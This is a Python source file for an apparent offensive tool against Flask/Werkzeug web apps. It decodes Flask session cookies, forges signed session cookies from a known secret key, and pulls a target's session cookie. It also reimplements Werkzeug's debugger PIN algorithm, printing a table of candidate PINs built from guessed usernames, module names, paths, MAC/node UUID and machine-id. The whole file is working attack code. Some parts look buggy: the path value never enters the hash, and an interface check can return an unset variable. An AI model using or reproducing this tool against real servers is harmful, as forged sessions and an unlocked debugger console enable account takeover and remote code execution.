import vial
from vial.session import decode, sign
from rich.prompt import Prompt as prompt
from rich.prompt import Confirm as confirm
from rich.table import Table
import json
import requests
import ipaddress
import netifaces
from typing import TypedDict
import hashlib
from itertools import chain, product
import tomllib
from collections import ChainMap


class Proxy(TypedDict):
    http: str
    https: str


def check_iface(iface: str): 
    try:
        host = ipaddress.IPv4Address(iface)
    except ipaddress.AddressValueError:
        try:
            host = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]["addr"]
        except ValueError:
            vial.log.error(
                "Error detering HTTP hosting address. Did you provide an [underline]interface[/underline] or [underline]ip[/underline]?"
            )
    return str(host)


def decode_handler() -> None:
    if not vial.FETCHED_COOKIE:
        cookie = prompt.ask("[bold blue][?][/] Enter the cookie")
    else:
        cookie = vial.FETCHED_COOKIE

    cookie = decode(cookie)
    vial.log.info(f"Decoded cookie: [bold]{cookie}[/]")


def encode_handler() -> None:
    # NOTE: cookie = sign(json.loads(session_cookie_structure), secret_key, legacy=legacy)
    secret_key = prompt.ask("[bold blue][?][/] Enter the secret key")
    value = prompt.ask("[bold blue][?][/] Enter the session cookie")
    legacy = confirm.ask("[bold blue][?][/] Use a legacy timestamp")

    cookie = sign(json.loads(value), secret_key, legacy=legacy)
    # NOTE: Create arguments for SALT
    # actions = {"inject": inject_cookie, "save": save_cookie}

    # action = prompt.ask(
    #   "[bold blue][?][/] Pick an action",
    #  choices=[action for action in actions.keys()],
    # )
    vial.log.info(f"Encoded cookie: [bold]{cookie}[/]")


def inject_cookie():
    try:
        host = prompt.ask("[bold blue][?][/] Enter the host")
        resp = vial.web_session.get(
            host,
        )
    except requests.RequestException as e:
        return vial.log.error(
            f"Failed to fetch session data from the server. {e}",
        )

    vial.log.info(f"Server returned HTTP {resp.status_code} ({resp.reason})")


def fetch_cookie(
    host: str,
    cookie_name: str = vial.DEFAULT_COOKIE_NAME,
    session: requests.Session = vial.web_session,
) -> str:
    try:
        resp = vial.web_session.get(
            host,
            allow_redirects=False,
        )
    except requests.RequestException as e:
        return vial.log.error(
            f"Failed to fetch session data from the server. {e}",
        )

    vial.log.info(f"Server returned HTTP {resp.status_code} ({resp.reason})")
    cookie = vial.web_session.cookies.get(cookie_name)
    if not cookie:
        return vial.log.error(
            "Failed to fetch session data from the server. Are you sure the url  and cookie name are correct?",
        )
    vial.log.info(f"[bold green][+][/] Session cookie: [bold]{cookie}[/]")
    return cookie

def generate_pin(
        username,
        modname,
        appname,
        app_path,
        node_uuid,
        machine_id
    ) -> str:
    salt = vial.DEFAULT_SALT.encode()
    public_bits = [
        username,
        modname,
        appname
    ]
    private_bits = [
        node_uuid,
        machine_id
    ]
    #h = hashlib.md5() # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
    h = hashlib.sha1() 
    for bit in chain(public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode('utf-8')
        h.update(bit)
    h.update(salt)

    cookie_name = '__wzd' + h.hexdigest()[:20]

    num = None
    if num is None:
        h.update(salt)
        num = ('%09d' % int(h.hexdigest(), 16))[:9]

    rv = None
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                              for x in range(0, len(num), group_size))
                break
        else:
            rv = num

    return rv 

def pin_handler(config: str) -> bytes:
    """
    public_bits = [
        username,
        modname,
        app_name,
        path
    ]
    private_bits = [
        mac,
        machine_id
    ]
    """
    #NOTE: Parse config.toml and extract public/private bits.
    with open(config, "rb") as fd:
        data = tomllib.load(fd)["pin_gen"]

    values = [
        data[bit] for bit in (
            "usernames",
            "modnames",
            "appnames",
            "paths", 
            "node_uuid",
            "machine_id"
        )
    ]
    #data_bits = {
    #    "public": [],
    #    "private": []
    #}
    #data_bits["public"] = [
    #    data[bit] for bit in (
    #        "username",
    #        "modname",
    #        "app_name",
    #        "paths"
    #    )
    #]
    #data_bits["private"] = [
    #    data[bit] for bit in (
    #        "mac",
    #        "machine-id"
    #    )
    #]
    vial.log.info(f"Using config -> {config}:\n{data}")
    
    #NOTE: Filter out the optional/empty bits
    #combined_bits = ChainMap(public_bits, private_bits)
    #values = [
    #    value for value in combined_bits.values()
    #    if value not in ("", [])
    #]
    #NOTE: Check if the required public/private bits exist.
    #values = []
    #for value_list in data_bits.values():
    #    for value in value_list:
    #        values.append(value)
    if len(values) != len(data.keys()) - 1:
        vial.log.critical("Missing required bits.")
        exit(1)
    #NOTE: Generate a PIN for all the combinations
    combinations = product(*values)
    table = Table(title="Werkzeug Possible PINs")
    table.add_column("PINs", justify="left", style="green", no_wrap=True)
    table.add_column("Combination", style="cyan")

    for combo in combinations:
        pin = generate_pin(*combo)
        table.add_row(pin, str(combo))
    vial.console.print(table)
